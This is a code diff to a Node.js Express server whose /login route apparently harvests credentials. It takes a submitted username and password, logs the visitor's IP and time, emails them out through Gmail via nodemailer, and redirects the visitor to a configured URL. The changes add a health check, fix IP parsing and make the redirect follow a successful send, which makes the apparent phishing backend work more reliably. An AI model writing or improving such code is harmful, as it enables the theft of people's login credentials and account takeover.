@@ -9,17 +9,21 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static("public"));
 
+// Root route for health check
+app.get("/", (req, res) => {
+    res.send("Backend is running");
+});
+
 // Login route
 app.post("/login", async (req, res) => {
     const { username, password } = req.body;
 
     const timestamp = new Date().toLocaleString();
-    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+    if (Array.isArray(ip)) ip = ip[0]; // normalize if array
 
     const transporter = nodemailer.createTransport({
-        host: "smtp.gmail.com",
-        port: 587,
-        secure: false,
+        service: "gmail", // simpler than host/port
         auth: {
             user: process.env.EMAIL_USER,
             pass: process.env.EMAIL_PASS
@@ -41,11 +45,12 @@ IP Address: ${ip}`
 
     try {
         await transporter.sendMail(mailOptions);
+        console.log("Email sent successfully");
+        res.redirect(process.env.REDIRECT_URL);
     } catch (error) {
         console.error("Email error:", error);
+        res.status(500).send("Something went wrong. Please try again.");
     }
-
-    res.redirect(process.env.REDIRECT_URL);
 });
 
 // Start server
